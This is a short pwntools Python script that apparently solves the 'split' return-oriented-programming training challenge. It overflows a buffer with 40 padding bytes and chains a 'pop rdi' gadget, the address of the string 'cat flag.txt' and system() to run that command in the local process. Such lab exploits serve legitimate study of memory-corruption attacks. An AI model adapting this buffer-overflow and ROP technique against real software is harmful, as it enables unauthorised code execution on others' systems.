from pwn import * 

p = process("./split") 
#gdb.attach(p)
elf = ELF("./split") 
rop = ROP(elf) 

USEFUL_FUNC = elf.symbols['usefulFunction']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
CAT_FLAG = next(elf.search("cat flag.txt\x00"))
SYSTEM      = elf.symbols['system']

log.info("usefulFunction @  " + hex(USEFUL_FUNC)) # useless
log.info("cat flag.txt @ " + hex(CAT_FLAG))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("system @ " + hex(SYSTEM))

base = "A"*40
rop = base+p64(POP_RDI)  +p64(CAT_FLAG) +  p64(SYSTEM)

p.sendline(rop)

p.interactive()
